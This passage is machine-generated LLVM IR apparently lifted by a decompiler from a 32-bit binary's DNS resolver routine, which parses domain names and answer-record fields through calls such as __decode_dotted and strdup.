  %v1_8067171 = add i32 %v0_8067171, 16
  %v1_8067174 = add i32 %v0_8067171, 76
  %v2_8067174 = inttoptr i32 %v1_8067174 to i32*
  %v3_8067174 = load i32, i32* %v2_8067174, align 4
  store i32 %v3_8067174, i32* %ecx.global-to-local, align 4
  %v1_8067178 = add i32 %v0_8067171, 356
  %v2_8067178 = inttoptr i32 %v1_8067178 to i32*
  %v3_8067178 = load i32, i32* %v2_8067178, align 4
  %v15_8067178 = icmp eq i32 %v3_8067178, %v3_8067174
  store i1 %v15_8067178, i1* %zf.global-to-local, align 1
  %v1_806717f = icmp eq i1 %v15_8067178, false
  br i1 %v1_806717f, label %dec_label_pc_806714d, label %dec_label_pc_8067181

dec_label_pc_8067181:                             ; preds = %dec_label_pc_8067168
  %v1_8067181 = add i32 %v0_8067171, 360
  %v2_8067181 = inttoptr i32 %v1_8067181 to i32*
  %v3_8067181 = load i32, i32* %v2_8067181, align 4
  %v4_8067181 = icmp eq i32 %v3_8067181, 0
  store i1 %v4_8067181, i1* %zf.global-to-local, align 1
  br i1 %v4_8067181, label %dec_label_pc_806714d, label %dec_label_pc_806718b

dec_label_pc_806718b:                             ; preds = %dec_label_pc_8067181
  %v1_806718b = add i32 %v0_8067171, 384
  %v2_806718b = inttoptr i32 %v1_806718b to i32*
  %v3_806718b = load i32, i32* %v2_806718b, align 4
  store i32 %v3_806718b, i32* %edx.global-to-local, align 4
  %v1_8067192 = add i32 %v3_806718b, -2
  store i32 %v1_8067192, i32* @eax, align 4
  %v5_8067195 = icmp eq i32 %v1_8067192, 0
  %v9_8067195 = icmp eq i32 %v3_806718b, 3
  store i1 %v9_8067195, i1* %zf.global-to-local, align 1
  %v2_8067198 = or i1 %v5_8067195, %v9_8067195
  br i1 %v2_8067198, label %dec_label_pc_806719a, label %dec_label_pc_80671c6

dec_label_pc_806719a:                             ; preds = %dec_label_pc_806718b
  %v1_806719a = add i32 %v0_8067171, 39
  %v2_806719a = inttoptr i32 %v1_806719a to i8*
  %v3_806719a = load i8, i8* %v2_806719a, align 1
  %v12_806719a = icmp eq i8 %v3_806719a, 46
  store i1 %v12_806719a, i1* %zf.global-to-local, align 1
  br i1 %v12_806719a, label %dec_label_pc_80671b5, label %dec_label_pc_80671a1

dec_label_pc_80671a1:                             ; preds = %dec_label_pc_806719a
  %v1_80671a1 = add i32 %v0_8067171, 40
  %v2_80671a1 = inttoptr i32 %v1_80671a1 to i32*
  %v3_80671a1 = load i32, i32* %v2_80671a1, align 4
  %v1_80671a5 = add i32 %v3_80671a1, -1
  store i32 %v1_80671a5, i32* @eax, align 4
  %v1_80671a6 = add i32 %v0_8067171, 68
  %v2_80671a6 = inttoptr i32 %v1_80671a6 to i32*
  %v3_80671a6 = load i32, i32* %v2_80671a6, align 4
  %v5_80671a6 = sub i32 %v3_80671a6, %v1_80671a5
  %v11_80671a6 = xor i32 %v3_80671a6, %v1_80671a5
  %v12_80671a6 = xor i32 %v5_80671a6, %v3_80671a6
  %v13_80671a6 = and i32 %v12_80671a6, %v11_80671a6
  %v14_80671a6 = icmp slt i32 %v13_80671a6, 0
  %v15_80671a6 = icmp eq i32 %v5_80671a6, 0
  store i1 %v15_80671a6, i1* %zf.global-to-local, align 1
  %v16_80671a6 = icmp slt i32 %v5_80671a6, 0
  %v2_80671aa = icmp eq i1 %v16_80671a6, %v14_80671a6
  br i1 %v2_80671aa, label %dec_label_pc_80671b5, label %dec_label_pc_80671ac

dec_label_pc_80671ac:                             ; preds = %dec_label_pc_80671a1
  %v4_80671ac = add i32 %v3_80671a6, 1
  %v11_80671ac = icmp eq i32 %v4_80671ac, 0
  store i1 %v11_80671ac, i1* %zf.global-to-local, align 1
  store i32 %v4_80671ac, i32* %v2_80671a6, align 4
  br label %dec_label_pc_8067542

dec_label_pc_80671b5:                             ; preds = %dec_label_pc_80671a1, %dec_label_pc_806719a
  store i32 -4, i32* @eax, align 4
  store i32 1, i32* inttoptr (i32 -4 to i32*), align 4
  br label %dec_label_pc_806756d

dec_label_pc_80671c6:                             ; preds = %dec_label_pc_806718b
  %v1_80671c6 = icmp eq i32 %v3_806718b, 0
  store i1 %v1_80671c6, i1* %zf.global-to-local, align 1
  %v1_80671c8 = icmp eq i1 %v1_80671c6, false
  br i1 %v1_80671c8, label %dec_label_pc_8067536, label %dec_label_pc_80671ce

dec_label_pc_80671ce:                             ; preds = %dec_label_pc_80671c6
  %v1_80671ce = add i32 %v0_8067171, 392
  %v2_80671ce = inttoptr i32 %v1_80671ce to i32*
  %v3_80671ce = load i32, i32* %v2_80671ce, align 4
  %v4_80671ce = icmp eq i32 %v3_80671ce, 0
  store i1 %v4_80671ce, i1* %zf.global-to-local, align 1
  %tmp51 = icmp slt i32 %v3_80671ce, 1
  br i1 %tmp51, label %dec_label_pc_80671ea, label %dec_label_pc_80671d8

dec_label_pc_80671d8:                             ; preds = %dec_label_pc_80671ce
  %v1_80671d8 = add i32 %v0_8067171, 44
  %v2_80671d8 = inttoptr i32 %v1_80671d8 to i32*
  store i32 0, i32* %v2_80671d8, align 4
  %v0_80671e0 = load i32, i32* @esp, align 4
  %v1_80671e0 = add i32 %v0_80671e0, 64
  %v2_80671e0 = inttoptr i32 %v1_80671e0 to i32*
  store i32 12, i32* %v2_80671e0, align 4
  br label %dec_label_pc_8067265

dec_label_pc_80671ea:                             ; preds = %dec_label_pc_80671ce
  store i32 -4, i32* @eax, align 4
  store i32 4, i32* inttoptr (i32 -4 to i32*), align 4
  br label %dec_label_pc_806756d

dec_label_pc_80671fb:                             ; preds = %dec_label_pc_8067265
  %v1_80671fb = add i32 %v0_8067265, 64
  %v2_80671fb = inttoptr i32 %v1_80671fb to i32*
  %v3_80671fb = load i32, i32* %v2_80671fb, align 4
  %v3_80671ff = add i32 %v3_80671fb, %v2_8066e3e
  %v13_80671ff = icmp eq i32 %v3_80671ff, 0
  store i1 %v13_80671ff, i1* %zf.global-to-local, align 1
  store i32 %v3_80671ff, i32* @edi, align 4
  br i1 %v13_80671ff, label %dec_label_pc_8067536, label %dec_label_pc_8067207

dec_label_pc_8067207:                             ; preds = %dec_label_pc_80671fb
  %v1_8067207 = add i32 %v0_8067265, 36
  %v2_8067207 = inttoptr i32 %v1_8067207 to i32*
  %v3_8067207 = load i32, i32* %v2_8067207, align 4
  store i32 %v3_8067207, i32* %ebx.global-to-local, align 4
  store i32 %v3_80671ff, i32* @esi, align 4
  %v4_806720d = load i32, i32* %v2_80671fb, align 4
  %v5_806720d = sub i32 %v3_8067207, %v4_806720d
  %v15_806720d = icmp eq i32 %v5_806720d, 0
  store i32 %v5_806720d, i32* @ebx, align 4
  store i1 %v15_806720d, i1* %zf.global-to-local, align 1
  %tmp5267 = icmp slt i32 %v5_806720d, 1
  br i1 %tmp5267, label %dec_label_pc_8067536, label %dec_label_pc_8067219

dec_label_pc_8067219:                             ; preds = %dec_label_pc_8067207, %dec_label_pc_806723b
  %v0_806723b70 = phi i32 [ %v1_8067242, %dec_label_pc_806723b ], [ %v5_806720d, %dec_label_pc_8067207 ]
  %v0_806723369 = phi i32 [ %v2_806723f, %dec_label_pc_806723b ], [ %v3_80671ff, %dec_label_pc_8067207 ]
  %v4_806721968 = phi i32 [ %v2_806723d, %dec_label_pc_806723b ], [ %v3_8067265, %dec_label_pc_8067207 ]
  %v1_8067219 = inttoptr i32 %v0_806723369 to i8*
  %v2_8067219 = load i8, i8* %v1_8067219, align 1
  %v3_8067219 = zext i8 %v2_8067219 to i32
  %v5_8067219 = and i32 %v4_806721968, -256
  %v6_8067219 = or i32 %v3_8067219, %v5_8067219
  store i32 %v6_8067219, i32* @eax, align 4
  %v1_806721b = add i32 %v0_806723369, 1
  store i32 %v1_806721b, i32* %ecx.global-to-local, align 4
  %v4_806721e = icmp eq i8 %v2_8067219, 0
  store i1 %v4_806721e, i1* %zf.global-to-local, align 1
  br i1 %v4_806721e, label %dec_label_pc_8067247, label %dec_label_pc_8067222

dec_label_pc_8067222:                             ; preds = %dec_label_pc_8067219
  store i32 %v3_8067219, i32* %edx.global-to-local, align 4
  %v1_8067227 = and i32 %v3_8067219, 192
  store i32 %v1_8067227, i32* @eax, align 4
  %v6_806722c = icmp eq i32 %v1_8067227, 192
  store i1 %v6_806722c, i1* %zf.global-to-local, align 1
  %v1_8067231 = icmp eq i1 %v6_806722c, false
  br i1 %v1_8067231, label %dec_label_pc_806723b, label %dec_label_pc_8067233

dec_label_pc_8067233:                             ; preds = %dec_label_pc_8067222
  %v1_8067233 = add i32 %v0_806723369, 2
  store i32 %v1_8067233, i32* %ecx.global-to-local, align 4
  %v1_8067236 = add i32 %v0_806723b70, -2
  %v9_8067236 = icmp eq i32 %v1_8067236, 0
  store i1 %v9_8067236, i1* %zf.global-to-local, align 1
  store i32 %v1_8067236, i32* @ebx, align 4
  br label %dec_label_pc_8067247

dec_label_pc_806723b:                             ; preds = %dec_label_pc_8067222
  %v2_806723d = sub i32 %v0_806723b70, %v3_8067219
  store i32 %v2_806723d, i32* @eax, align 4
  %v2_806723f = add i32 %v3_8067219, %v1_806721b
  store i32 %v2_806723f, i32* @esi, align 4
  %v1_8067242 = add i32 %v2_806723d, -1
  store i32 %v1_8067242, i32* @ebx, align 4
  %v1_8067211 = icmp eq i32 %v1_8067242, 0
  store i1 %v1_8067211, i1* %zf.global-to-local, align 1
  %tmp52 = icmp slt i32 %v1_8067242, 1
  br i1 %tmp52, label %dec_label_pc_8067536, label %dec_label_pc_8067219

dec_label_pc_8067247:                             ; preds = %dec_label_pc_8067219, %dec_label_pc_8067233
  %v0_8067250 = phi i32 [ %v1_8067233, %dec_label_pc_8067233 ], [ %v1_806721b, %dec_label_pc_8067219 ]
  %v0_8067247 = phi i32 [ %v1_8067236, %dec_label_pc_8067233 ], [ %v0_806723b70, %dec_label_pc_8067219 ]
  %v1_8067247 = add i32 %v0_8067247, -3
  %v6_8067247 = sub i32 2, %v0_8067247
  %v7_8067247 = and i32 %v6_8067247, %v0_8067247
  %v8_8067247 = icmp slt i32 %v7_8067247, 0
  %v9_8067247 = icmp eq i32 %v1_8067247, 0
  store i1 %v9_8067247, i1* %zf.global-to-local, align 1
  %v10_8067247 = icmp slt i32 %v1_8067247, 0
  %v3_806724a = icmp ne i1 %v10_8067247, %v8_8067247
  %v4_806724a = or i1 %v9_8067247, %v3_806724a
  br i1 %v4_806724a, label %dec_label_pc_8067536, label %dec_label_pc_8067250

dec_label_pc_8067250:                             ; preds = %dec_label_pc_8067247
  %v2_8067250 = sub i32 %v0_8067250, %v3_80671ff
  store i32 %v2_8067250, i32* %ecx.global-to-local, align 4
  %v1_8067254 = add i32 %v2_8067250, 4
  %v9_8067254 = icmp eq i32 %v1_8067254, 0
  store i1 %v9_8067254, i1* %zf.global-to-local, align 1
  %v10_8067254 = icmp slt i32 %v1_8067254, 0
  store i32 %v1_8067254, i32* @eax, align 4
  br i1 %v10_8067254, label %dec_label_pc_8067536, label %dec_label_pc_806725d

dec_label_pc_806725d:                             ; preds = %dec_label_pc_8067250
  %v3_806725d = load i32, i32* %v2_80671fb, align 4
  %v5_806725d = add i32 %v3_806725d, %v1_8067254
  store i32 %v5_806725d, i32* %v2_80671fb, align 4
  %v0_8067261 = load i32, i32* @esp, align 4
  %v1_8067261 = add i32 %v0_8067261, 28
  %v2_8067261 = inttoptr i32 %v1_8067261 to i32*
  %v3_8067261 = load i32, i32* %v2_8067261, align 4
  %v4_8067261 = add i32 %v3_8067261, 1
  %v11_8067261 = icmp eq i32 %v4_8067261, 0
  store i1 %v11_8067261, i1* %zf.global-to-local, align 1
  store i32 %v4_8067261, i32* %v2_8067261, align 4
  br label %dec_label_pc_8067265

dec_label_pc_8067265:                             ; preds = %dec_label_pc_80671d8, %dec_label_pc_806725d
  %v0_8067265 = load i32, i32* @esp, align 4
  %v1_8067265 = add i32 %v0_8067265, 28
  %v2_8067265 = inttoptr i32 %v1_8067265 to i32*
  %v3_8067265 = load i32, i32* %v2_8067265, align 4
  store i32 %v3_8067265, i32* @eax, align 4
  %v2_8067269 = add i32 %v0_8067265, 372
  %v3_8067269 = inttoptr i32 %v2_8067269 to i32*
  %v4_8067269 = load i32, i32* %v3_8067269, align 4
  %v5_8067269 = sub i32 %v3_8067265, %v4_8067269
  %v11_8067269 = xor i32 %v4_8067269, %v3_8067265
  %v12_8067269 = xor i32 %v5_8067269, %v3_8067265
  %v13_8067269 = and i32 %v12_8067269, %v11_8067269
  %v14_8067269 = icmp slt i32 %v13_8067269, 0
  %v15_8067269 = icmp eq i32 %v5_8067269, 0
  store i1 %v15_8067269, i1* %zf.global-to-local, align 1
  %v16_8067269 = icmp slt i32 %v5_8067269, 0
  %v2_8067270 = icmp eq i1 %v16_8067269, %v14_8067269
  br i1 %v2_8067270, label %dec_label_pc_8067272, label %dec_label_pc_80671fb

dec_label_pc_8067272:                             ; preds = %dec_label_pc_8067265
  %v1_8067272 = add i32 %v0_8067265, 524
  %v2_8067272 = inttoptr i32 %v1_8067272 to i32*
  %v3_8067272 = load i32, i32* %v2_8067272, align 4
  store i32 %v3_8067272, i32* %edx.global-to-local, align 4
  %v1_8067279 = add i32 %v0_8067265, 388
  store i32 %v1_8067279, i32* %ecx.global-to-local, align 4
  %v1_8067280 = add i32 %v0_8067265, 72
  %v2_8067280 = inttoptr i32 %v1_8067280 to i32*
  store i32 0, i32* %v2_8067280, align 4
  %v0_8067288 = load i32, i32* @esp, align 4
  %v1_8067288 = add i32 %v0_8067288, 43
  %v2_8067288 = inttoptr i32 %v1_8067288 to i8*
  store i8 1, i8* %v2_8067288, align 1
  %v0_806728d = load i32, i32* %ecx.global-to-local, align 4
  %v1_806728d = load i32, i32* @esp, align 4
  %v2_806728d = add i32 %v1_806728d, 4
  %v3_806728d = inttoptr i32 %v2_806728d to i32*
  store i32 %v0_806728d, i32* %v3_806728d, align 4
  %v0_8067291 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067291 = inttoptr i32 %v0_8067291 to i32*
  store i32 0, i32* %v1_8067291, align 4
  br label %dec_label_pc_80674e7

dec_label_pc_806729c:                             ; preds = %dec_label_pc_80674e7
  %v9_806729c = icmp eq i32 %v0_80674e7, 12
  store i1 %v9_806729c, i1* %zf.global-to-local, align 1
  %v1_806729f = add i32 %v0_80674e7, -16
  %v2_806729f = inttoptr i32 %v1_806729f to i32*
  store i32 256, i32* %v2_806729f, align 4
  %v1_80672a4 = add i32 %v0_80674e7, 84
  store i32 %v1_80672a4, i32* @eax, align 4
  %v2_80672a8 = add i32 %v0_80674e7, -20
  %v3_80672a8 = inttoptr i32 %v2_80672a8 to i32*
  store i32 %v1_80672a4, i32* %v3_80672a8, align 4
  %v1_80672a9 = add i32 %v0_80674e7, 36
  %v2_80672a9 = inttoptr i32 %v1_80672a9 to i32*
  %v3_80672a9 = load i32, i32* %v2_80672a9, align 4
  %v5_80672a9 = add i32 %v0_80674e7, -24
  %v6_80672a9 = inttoptr i32 %v5_80672a9 to i32*
  store i32 %v3_80672a9, i32* %v6_80672a9, align 4
  %v1_80672ad = add i32 %v0_80674e7, 64
  %v2_80672ad = inttoptr i32 %v1_80672ad to i32*
  %v3_80672ad = load i32, i32* %v2_80672ad, align 4
  %v5_80672ad = add i32 %v0_80674e7, -28
  %v6_80672ad = inttoptr i32 %v5_80672ad to i32*
  store i32 %v3_80672ad, i32* %v6_80672ad, align 4
  %v3_80672b1 = add i32 %v0_80674e7, -32
  %v4_80672b1 = inttoptr i32 %v3_80672b1 to i32*
  store i32 %v2_8066e3e, i32* %v4_80672b1, align 4
  %v5_80672b2 = call i32 @__decode_dotted(i32 %v3_8066ee8, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80672b2, i32* @eax, align 4
  %v0_80672b7 = load i32, i32* @esp, align 4
  %v1_80672b7 = add i32 %v0_80672b7, 32
  %v1_80672ba = icmp eq i32 %v5_80672b2, 0
  store i1 %v1_80672ba, i1* %zf.global-to-local, align 1
  %v2_80672ba = icmp slt i32 %v5_80672b2, 0
  store i32 %v5_80672b2, i32* @ebx, align 4
  br i1 %v2_80672ba, label %dec_label_pc_8067385, label %dec_label_pc_80672c4

dec_label_pc_80672c4:                             ; preds = %dec_label_pc_806729c
  %v1_80672c4 = add i32 %v5_80672b2, 10
  store i32 %v1_80672c4, i32* @edi, align 4
  %v1_80672c7 = add i32 %v0_80672b7, 68
  %v2_80672c7 = inttoptr i32 %v1_80672c7 to i32*
  %v3_80672c7 = load i32, i32* %v2_80672c7, align 4
  store i32 %v3_80672c7, i32* %eax.global-to-local, align 4
  %v2_80672cb = add i32 %v0_80672b7, 96
  %v3_80672cb = inttoptr i32 %v2_80672cb to i32*
  %v4_80672cb = load i32, i32* %v3_80672cb, align 4
  %v5_80672cb = sub i32 %v3_80672c7, %v4_80672cb
  %v2_80672cf = sub i32 %v5_80672cb, %v1_80672c4
  %v12_80672cf = icmp eq i32 %v2_80672cf, 0
  store i1 %v12_80672cf, i1* %zf.global-to-local, align 1
  %v13_80672cf = icmp slt i32 %v2_80672cf, 0
  store i32 %v2_80672cf, i32* @eax, align 4
  %v2_80672d1 = add i32 %v0_80672b7, 100
  %v3_80672d1 = inttoptr i32 %v2_80672d1 to i32*
  store i32 %v2_80672cf, i32* %v3_80672d1, align 4
  %v1_80672d5 = icmp eq i1 %v13_80672cf, false
  br i1 %v1_80672d5, label %dec_label_pc_80672de, label %dec_label_pc_80672d7

dec_label_pc_80672d7:                             ; preds = %dec_label_pc_80672c4
  %v0_80672d7 = load i32, i32* @eax, align 4
  %v0_80673a3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8067381

dec_label_pc_80672de:                             ; preds = %dec_label_pc_80672c4
  %v0_80672de = load i32, i32* @esp, align 4
  %v1_80672de = add i32 %v0_80672de, 64
  %v2_80672de = inttoptr i32 %v1_80672de to i32*
  %v3_80672de = load i32, i32* %v2_80672de, align 4
  store i32 %v3_80672de, i32* %edx.global-to-local, align 4
  %v9_80672e2 = icmp eq i32 %v0_80672de, 12
  store i1 %v9_80672e2, i1* %zf.global-to-local, align 1
  %v1_80672e5 = add i32 %v0_80672de, 84
  store i32 %v1_80672e5, i32* %ecx.global-to-local, align 4
  %v2_80672e9 = add i32 %v0_80672de, -16
  %v3_80672e9 = inttoptr i32 %v2_80672e9 to i32*
  store i32 %v1_80672e5, i32* %v3_80672e9, align 4
  %v0_80672ea = load i32, i32* @ebx, align 4
  %v1_80672ea = load i32, i32* %edx.global-to-local, align 4
  %v2_80672ea = add i32 %v1_80672ea, %v0_80672ea
  store i32 %v2_80672ea, i32* @esi, align 4
  %v0_80672ed = call i32 @__GI_strdup()
  store i32 %v0_80672ed, i32* %eax.global-to-local, align 4
  %v2_80672f2 = load i32, i32* @esi, align 4
  %v3_80672f2 = add i32 %v2_80672f2, %v2_8066e3e
  store i32 %v3_80672f2, i32* %ebx.global-to-local, align 4
  %v1_80672f6 = add i32 %v2_80672f2, 10
  %v9_80672f6 = icmp eq i32 %v1_80672f6, 0
  store i1 %v9_80672f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80672f6, i32* @esi, align 4
  %v1_80672f9 = add i32 %v3_80672f2, 4
  store i32 %v1_80672f9, i32* %ecx.global-to-local, align 4
  %v1_80672fc = load i32, i32* @esp, align 4
  %v2_80672fc = add i32 %v1_80672fc, 404
  %v3_80672fc = inttoptr i32 %v2_80672fc to i32*
  store i32 %v0_80672ed, i32* %v3_80672fc, align 4
  %v0_8067303 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067303 = inttoptr i32 %v0_8067303 to i8*
  %v2_8067303 = load i8, i8* %v1_8067303, align 1
  %v3_8067303 = zext i8 %v2_8067303 to i32
  store i32 %v3_8067303, i32* %eax.global-to-local, align 4
  %v1_8067306 = add i32 %v0_8067303, 1
  %v2_8067306 = inttoptr i32 %v1_8067306 to i8*
  %v3_8067306 = load i8, i8* %v2_8067306, align 1
  %v4_8067306 = zext i8 %v3_8067306 to i32
  %v2_806730a = mul nuw nsw i32 %v3_8067303, 256
  store i32 %v2_806730a, i32* %eax.global-to-local, align 4
  %v2_806730d = or i32 %v4_8067306, %v2_806730a
  %v3_806730d = icmp eq i32 %v2_806730d, 0
  store i1 %v3_806730d, i1* %zf.global-to-local, align 1
  store i32 %v2_806730d, i32* %edx.global-to-local, align 4
  %v1_806730f = load i32, i32* @esp, align 4
  %v2_806730f = add i32 %v1_806730f, 408
  %v3_806730f = inttoptr i32 %v2_806730f to i32*
  store i32 %v2_806730d, i32* %v3_806730f, align 4
  %v0_8067316 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067316 = add i32 %v0_8067316, 2
  %v2_8067316 = inttoptr i32 %v1_8067316 to i8*
  %v3_8067316 = load i8, i8* %v2_8067316, align 1
  %v4_8067316 = zext i8 %v3_8067316 to i32
  store i32 %v4_8067316, i32* %eax.global-to-local, align 4
  %v1_806731a = add i32 %v0_8067316, 3
  %v2_806731a = inttoptr i32 %v1_806731a to i8*
  %v3_806731a = load i8, i8* %v2_806731a, align 1
  %v4_806731a = zext i8 %v3_806731a to i32
  %v2_806731e = mul nuw nsw i32 %v4_8067316, 256
  store i32 %v2_806731e, i32* %eax.global-to-local, align 4
  %v2_8067321 = or i32 %v4_806731a, %v2_806731e
  %v3_8067321 = icmp eq i32 %v2_8067321, 0
  store i1 %v3_8067321, i1* %zf.global-to-local, align 1
  store i32 %v2_8067321, i32* %edx.global-to-local, align 4
  %v1_8067323 = load i32, i32* @esp, align 4
  %v2_8067323 = add i32 %v1_8067323, 412
  %v3_8067323 = inttoptr i32 %v2_8067323 to i32*
  store i32 %v2_8067321, i32* %v3_8067323, align 4
  %v0_806732a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806732a = add i32 %v0_806732a, 4
  %v2_806732a = inttoptr i32 %v1_806732a to i8*
  %v3_806732a = load i8, i8* %v2_806732a, align 1
  %v4_806732a = zext i8 %v3_806732a to i32
  store i32 %v4_806732a, i32* %eax.global-to-local, align 4
  %v0_806732e = load i32, i32* %ecx.global-to-local, align 4
  %v1_806732e = add i32 %v0_806732e, 3
  %v2_806732e = inttoptr i32 %v1_806732e to i8*
  %v3_806732e = load i8, i8* %v2_806732e, align 1
  %v4_806732e = zext i8 %v3_806732e to i32
  %v2_8067332 = mul nuw i32 %v4_806732a, 16777216
  store i32 %v2_8067332, i32* %eax.global-to-local, align 4
  %v2_8067335 = or i32 %v4_806732e, %v2_8067332
  %v3_8067335 = icmp eq i32 %v2_8067335, 0
  store i1 %v3_8067335, i1* %zf.global-to-local, align 1
  store i32 %v2_8067335, i32* %edx.global-to-local, align 4
  %v1_8067337 = add i32 %v0_806732e, 1
  %v2_8067337 = inttoptr i32 %v1_8067337 to i8*
  %v3_8067337 = load i8, i8* %v2_8067337, align 1
  %v4_8067337 = zext i8 %v3_8067337 to i32
  %v2_806733b = mul nuw nsw i32 %v4_8067337, 65536
  store i32 %v2_806733b, i32* %eax.global-to-local, align 4
  %v2_806733e = or i32 %v2_806733b, %v2_8067335
  %v3_806733e = icmp eq i32 %v2_806733e, 0
  store i1 %v3_806733e, i1* %zf.global-to-local, align 1
  store i32 %v2_806733e, i32* %edx.global-to-local, align 4
  %v1_8067340 = add i32 %v0_806732e, 2
  %v2_8067340 = inttoptr i32 %v1_8067340 to i8*
  %v3_8067340 = load i8, i8* %v2_8067340, align 1
  %v4_8067340 = zext i8 %v3_8067340 to i32
  %v2_8067344 = mul nuw nsw i32 %v4_8067340, 256
  store i32 %v2_8067344, i32* %eax.global-to-local, align 4
  %v2_8067347 = or i32 %v2_8067344, %v2_806733e
  %v3_8067347 = icmp eq i32 %v2_8067347, 0
  store i1 %v3_8067347, i1* %zf.global-to-local, align 1
  store i32 %v2_8067347, i32* %edx.global-to-local, align 4
  %v1_8067349 = load i32, i32* @esp, align 4
  %v2_8067349 = add i32 %v1_8067349, 416
  %v3_8067349 = inttoptr i32 %v2_8067349 to i32*
  store i32 %v2_8067347, i32* %v3_8067349, align 4
  %v0_8067350 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067350 = add i32 %v0_8067350, 8
  %v2_8067350 = inttoptr i32 %v1_8067350 to i8*
  %v3_8067350 = load i8, i8* %v2_8067350, align 1
  %v4_8067350 = zext i8 %v3_8067350 to i32
  store i32 %v4_8067350, i32* %eax.global-to-local, align 4
  %v1_8067354 = add i32 %v0_8067350, 9
  %v2_8067354 = inttoptr i32 %v1_8067354 to i8*
  %v3_8067354 = load i8, i8* %v2_8067354, align 1
  %v4_8067354 = zext i8 %v3_8067354 to i32
  store i32 %v4_8067354, i32* %edx.global-to-local, align 4
  %v1_8067358 = add i32 %v0_8067350, 10
  store i32 %v1_8067358, i32* @ebx, align 4
  %v1_806735b = load i32, i32* @esp, align 4
  %v2_806735b = add i32 %v1_806735b, 424
  %v3_806735b = inttoptr i32 %v2_806735b to i32*
  store i32 %v1_8067358, i32* %v3_806735b, align 4
  %v0_8067362 = load i32, i32* @esi, align 4
  %v1_8067362 = load i32, i32* @esp, align 4
  %v2_8067362 = add i32 %v1_8067362, 428
  %v3_8067362 = inttoptr i32 %v2_8067362 to i32*
  store i32 %v0_8067362, i32* %v3_8067362, align 4
  %v0_8067369 = load i32, i32* %eax.global-to-local, align 4
  %v2_8067369 = mul i32 %v0_8067369, 256
  store i32 %v2_8067369, i32* @eax, align 4
  %v0_806736c = load i32, i32* %edx.global-to-local, align 4
  %v2_806736c = or i32 %v0_806736c, %v2_8067369
  store i32 %v2_806736c, i32* %edx.global-to-local, align 4
  %v1_806736e = load i32, i32* @esp, align 4
  %v2_806736e = add i32 %v1_806736e, 420
  %v3_806736e = inttoptr i32 %v2_806736e to i32*
  store i32 %v2_806736c, i32* %v3_806736e, align 4
  %v0_8067375 = load i32, i32* @esp, align 4
  %v1_8067375 = add i32 %v0_8067375, 16
  %v1_8067378 = add i32 %v0_8067375, 84
  %v2_8067378 = inttoptr i32 %v1_8067378 to i32*
  %v3_8067378 = load i32, i32* %v2_8067378, align 4
  %v4_8067378 = load i32, i32* %edx.global-to-local, align 4
  %v5_8067378 = sub i32 %v3_8067378, %v4_8067378
  %v11_8067378 = xor i32 %v4_8067378, %v3_8067378
  %v12_8067378 = xor i32 %v5_8067378, %v3_8067378
  %v13_8067378 = and i32 %v12_8067378, %v11_8067378
  %v14_8067378 = icmp slt i32 %v13_8067378, 0
  %v15_8067378 = icmp eq i32 %v5_8067378, 0
  store i1 %v15_8067378, i1* %zf.global-to-local, align 1
  %v16_8067378 = icmp slt i32 %v5_8067378, 0
  %v2_806737c = icmp eq i1 %v16_8067378, %v14_8067378
  br i1 %v2_806737c, label %dec_label_pc_806737e, label %dec_label_pc_8067385

dec_label_pc_806737e:                             ; preds = %dec_label_pc_80672de
  %v0_806737e = load i32, i32* @edi, align 4
  %v2_806737e = add i32 %v0_806737e, %v4_8067378
  br label %dec_label_pc_8067381

dec_label_pc_8067381:                             ; preds = %dec_label_pc_80672d7, %dec_label_pc_806737e
  %v0_80673a3 = phi i32 [ %v0_80673a3.pre, %dec_label_pc_80672d7 ], [ %v1_8067375, %dec_label_pc_806737e ]
  %storemerge = phi i32 [ %v0_80672d7, %dec_label_pc_80672d7 ], [ %v2_806737e, %dec_label_pc_806737e ]
  store i32 %storemerge, i32* @ebx, align 4
  %v1_8067381 = icmp eq i32 %storemerge, 0
  store i1 %v1_8067381, i1* %zf.global-to-local, align 1
  %v2_8067381 = icmp slt i32 %storemerge, 0
  %v1_8067383 = icmp eq i1 %v2_8067381, false
  br i1 %v1_8067383, label %dec_label_pc_80673a3, label %dec_label_pc_8067385

dec_label_pc_8067385:                             ; preds = %dec_label_pc_8067381, %dec_label_pc_80672de, %dec_label_pc_806729c
  %v0_8067390 = phi i32 [ %v1_8067375, %dec_label_pc_80672de ], [ %v1_80672b7, %dec_label_pc_806729c ], [ %v0_80673a3, %dec_label_pc_8067381 ]
  %v1_8067385 = add i32 %v0_8067390, 72
  %v2_8067385 = inttoptr i32 %v1_8067385 to i32*
  %v3_8067385 = load i32, i32* %v2_8067385, align 4
  %v4_8067385 = icmp eq i32 %v3_8067385, 0
  store i1 %v4_8067385, i1* %zf.global-to-local, align 1
  br i1 %v4_8067385, label %dec_label_pc_8067536, label %dec_label_pc_8067390

dec_label_pc_8067390:                             ; preds = %dec_label_pc_8067385
  %v1_8067390 = add i32 %v0_8067390, 356
  %v2_8067390 = inttoptr i32 %v1_8067390 to i32*
  %v3_8067390 = load i32, i32* %v2_8067390, align 4
  %v4_8067390 = icmp eq i32 %v3_8067390, 0
  store i1 %v4_8067390, i1* %zf.global-to-local, align 1
  br i1 %v4_8067390, label %dec_label_pc_8067536, label %dec_label_pc_80674f8

dec_label_pc_80673a3:                             ; preds = %dec_label_pc_8067381
  %v1_80673a3 = add i32 %v0_80673a3, 43
  %v2_80673a3 = inttoptr i32 %v1_80673a3 to i8*
  %v3_80673a3 = load i8, i8* %v2_80673a3, align 1
  %v4_80673a3 = icmp eq i8 %v3_80673a3, 0
  store i1 %v4_80673a3, i1* %zf.global-to-local, align 1
  br i1 %v4_80673a3, label %dec_label_pc_806746e, label %dec_label_pc_80673ae

dec_label_pc_80673ae:                             ; preds = %dec_label_pc_80673a3
  %v1_80673ae = add i32 %v0_80673a3, 524
  %v2_80673ae = inttoptr i32 %v1_80673ae to i32*
  %v3_80673ae = load i32, i32* %v2_80673ae, align 4
  store i32 %v3_80673ae, i32* %edx.global-to-local, align 4
  %v1_80673b5 = add i32 %v3_80673ae, 28
  %v2_80673b5 = inttoptr i32 %v1_80673b5 to i32*
  %v3_80673b5 = load i32, i32* %v2_80673b5, align 4
